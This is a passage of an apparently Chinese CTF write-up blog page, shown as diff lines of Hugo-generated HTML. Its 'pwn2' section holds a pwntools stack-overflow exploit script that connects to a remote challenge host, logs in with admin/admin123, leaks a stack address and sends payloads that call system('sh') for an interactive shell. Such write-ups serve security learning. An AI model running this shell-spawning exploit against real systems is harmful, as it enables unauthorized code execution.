+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Running time: </span><span class="si">%s</span><span class="s1"> Seconds&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">example</span><span class="p">()</span>  
+</span></span></code></pre></div><div id="pwn2" class="anchor"></div>
+<h3 class="relative group">pwn2 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#pwn2" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>终于到哥们最爱的栈溢出了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># r = process(&#39;./short&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;4vq5.dg05.ciihw.cn&#39;</span><span class="p">,</span><span class="mi">43901</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Enter your username:&#34;</span><span class="p">,</span><span class="s2">&#34;admin</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Enter your password:&#34;</span><span class="p">,</span><span class="s2">&#34;admin123</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(r.recv(1024))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(r.recv(1024))</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;input this:&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;plz input your msg:&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">add</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stack_add</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">add</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">stack_add</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(r.recv(1024))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x0804A038</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_sys</span> <span class="o">=</span> <span class="mh">0x080484A0</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_add</span> <span class="o">=</span> <span class="mh">0x08048662</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="mi">76</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_add</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_add</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_sys</span> <span class="o">=</span> <span class="mh">0x080485E6</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">76</span><span class="o">+</span> <span class="mi">2</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;sh</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">add_sys</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">stack_add</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># payload = b&#39;sh\x00\x00&#39;*0x15+p32(add_sys)+b&#39;a&#39;*4+p32(stack_add)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><div id="go-on" class="anchor"></div>
+<h2 class="relative group">go on 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#go-on" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>11 月可能更新一些论文阅读 or 漏洞复现</p>
+
+        </div>
+                
+        
+
+        
+
+          
+      </div>
+     
+     <script>
+        var oid = "views_articles\\2024_10\\index.md"
+        var oid_likes = "likes_articles\\2024_10\\index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/articles/shangmicup2024/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >熵密杯2024</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-10-21 00:07:00 &#43;0800 CST">21 October 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      ベーコン
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.35c1113bcc16c5a59bf031082f9e63822aa95280423881a7847a7ff33a16e6299ce6a840d9ef4e10d947e030a18f3f20359afb2ec0f35967484b9a9360ac3145.js" integrity="sha512-NcERO8wWxaWb8DEIL55jgiqpUoBCOIGnhHp/8zoW5imc5qhA2e9OENlH4DChjz8gNZr7LsDzWWdIS5qTYKwxRQ=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://ljahum.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
